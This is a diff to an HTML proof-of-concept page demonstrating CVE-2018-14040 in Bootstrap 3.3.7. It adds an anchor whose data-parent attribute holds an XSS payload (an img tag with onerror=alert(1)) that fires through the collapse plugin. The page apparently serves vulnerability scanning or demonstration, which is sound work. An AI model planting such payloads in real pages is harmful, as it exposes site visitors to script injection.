@@ -7,10 +7,13 @@
     <link rel="stylesheet" href="./assets/bootstrap@3.3.7/dist/css/bootstrap.min.css">
   </head>
   <body>
-    <h1>POC SCA - Bootstrap 3.3.7 Local</h1>
+    <h1>POC SCA - Bootstrap 3.3.7 Local - CVE-2018-14040 - Bootstrap < 3.4.0 || < 4.1.2 - Requires user interaction</h1>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script src="./assets/bootstrap@3.3.7/dist/js/bootstrap.min.js"></script>
     <div class="mb-5">
         <a href="." class="btn btn-primary btn-lg px-4">Local files</a>
     </div>
+    <br>
+    <a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS</a>
   </body>
 </html>
